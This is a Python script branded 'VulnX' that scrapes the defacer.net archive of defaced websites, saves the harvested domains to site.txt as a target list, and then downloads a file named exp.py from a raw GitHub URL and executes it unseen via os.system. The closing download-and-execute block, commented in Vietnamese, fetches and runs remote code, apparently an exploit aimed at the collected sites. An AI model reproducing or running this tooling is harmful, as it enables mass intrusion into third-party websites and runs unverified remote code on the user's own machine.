import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import os
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

banner = """
\033[1;34m                                                      
                    .:.        .:,                    
                   xM;           XK.                  
                  dx'            .lO.                 
                 do                ,0.                
             .c.lN'      ,  '.     .k0.:'             
              xMMk;d;''cOM0kWXl,',locMMX.             
              .NMK.   :WMMMMMMMx    dMMc              
               lMMO  lWMMMMMMMMMO. lMMO               
                cWMxxMMMMMMMMMMMMKlWMk                
                 .xWMMMMMMMMMMMMMMM0,\033[1;36m                 
                   .,OMd,,,;0MMMO,.                   
             .l0O.\033[1;37mVXVX\033[1;36mOX\033[1;37mVXVX\033[1;36m0MO\033[1;37mVXVX\033[1;36m.0Kd,             
            lWMMO0\033[1;37mVXVX0\033[1;36mOX\033[1;37mVXVX\033[1;36ml\033[1;37mVXVX\033[1;36m.VXNMMO            
           .MMX;.N0\033[1;37mVXVX0\033[1;36m0X\033[1;37mVXVXVX0\033[1;36m.0M:.OMMl           
          .OXc  ,MMO\033[1;37mVXVX0\033[1;36mVX\033[1;37m .VXVX0\033[1;36m0MMo  ,0X'          
          0x.  :XMMMk\033[1;37mVXVX\033[1;36m.XO\033[1;37mVXVX\033[1;36mdMMMWo.  :X'         
         .d  'NMMMMMMk\033[1;37mVXVX\033[1;36m..\033[1;37mVXVX0\033[1;36m.XMMMMWl  ;c         
            'NNoMMMMMMx\033[1;37mVXVXVXVXVX0\033[1;36m.\033[1;37mXMMk0Mc            
           .NMx OMMMMMMd\033[1;37mVXVXVX\033[1;36ml\033[1;37mVXVX\033[1;36m.NW.;MMc           
          :NMMd .NMMMMMMd\033[1;37mVXVX\033[1;36mdMd,,,,oc ;MMWx          
          .0MN,  'XMMMMMMo\033[1;37mVX\033[1;36moMMMMMMWl   0MW,          
           .0.    .xWMMMMM:lMMMMMM0,     kc           
            ,O.     .:dOKXXXNKOxc.      do            
             '0c        -VulnX-       ,Ol             
               ;.                     :. 
"""

clear()
print(banner)

url_template = 'https://defacer.net/archive/{}'
urls = set()
total = 0

with open('site.txt', 'w') as file:
    for page in range(1, 751):
        response = requests.get(url_template.format(page))
        soup = BeautifulSoup(response.text, 'html.parser')

        for text in soup.stripped_strings:
            if '.' in text and not text.startswith(('http://', 'https://')):
                text = 'http://' + text

            parsed_url = urlparse(text)
            domain_parts = parsed_url.netloc.split(':')[0].split('.')
            domain_name = '.'.join(domain_parts[-2:]) if len(domain_parts) >= 2 else parsed_url.netloc

            if domain_name and domain_name not in urls:
                urls.add(domain_name)
                total += 1
                file.write(domain_name + '\n')
                sys.stdout.write(f"\033[32msucess:\033[35m {domain_name} \033[31m::\033[32m total:\033[35m {total} \033[31m::\033[32m save in site.txt\033[0m\n")
                sys.stdout.flush()

# Tải và chạy file từ GitHub
github_url = "https://raw.githubusercontent.com/tungdzai2011/tuyen/refs/heads/main/exp.py"
try:
    response = requests.get(github_url)
    if response.status_code == 200:
        with open('exp.py', 'w', encoding='utf-8') as f:
            f.write(response.text)
        print("\n\033[32m[*] Đã tải xong exp.py. Đang chạy file...\033[0m\n")
        os.system('python exp.py')
    else:
        print(f"\n\033[31m[!] Không thể tải file exp.py, mã lỗi {response.status_code}\033[0m\n")
except Exception as e:
    print(f"\n\033[31m[!] Lỗi khi tải hoặc chạy file exp.py: {e}\033[0m\n")
